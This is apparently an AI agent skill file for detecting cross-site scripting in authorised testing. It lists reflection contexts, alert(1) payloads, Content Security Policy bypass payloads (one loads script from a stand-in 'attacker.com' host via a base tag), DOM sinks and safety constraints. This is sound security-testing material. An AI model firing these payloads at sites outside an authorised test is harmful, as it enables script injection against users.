---
name: xss-detect
version: 0.1.0
description: XSS detection — reflected / stored / DOM-based, with CSP bypass payloads.
category: exploit
when_to_use: When endpoint reflects user input into HTML response.
allowed-tools: Bash, Read, Grep, Glob
user-invocable: true
---

# XSS Detect

## 1. Reflection points
- HTML context: between tags
- Attribute context: inside `id="..."`, `href="..."`
- Script context: inside `<script>...</script>`
- URL context: inside `href="javascript:..."`

## 2. Payloads (basic)
- HTML: `<script>alert(1)</script>`
- Attribute: `" onmouseover="alert(1)"`
- Script: `</script><script>alert(1)</script>`
- URL: `javascript:alert(1)`

## 3. CSP bypass
- `<script src=data:text/javascript,alert(1)>` (CSP: script-src 'self')
- `<meta http-equiv=refresh content=0;url=javascript:alert(1)>` (CSP: no default-src)
- `<base href=//attacker.com>` then `<script src=/js>` (CSP: relative-URL hijack)

## 4. DOM XSS sinks
- innerHTML / outerHTML
- document.write / document.writeln
- eval / setTimeout / setInterval
- location.hash / location.search
- postMessage handler

## 5. Write Finding
- severity: P0 (stored) / P1 (reflected) / P2 (DOM-only)
- evidence: 3 reflection tests + CSP header
- repro: curl with payload
- category: xss

## 6. Constraints
- Never trigger XSS in user-visible areas (e.g. alert() in production UI)
- Use safe payload (e.g. `print(1)` or DOM-marker) instead
- Confirm via headless browser if available
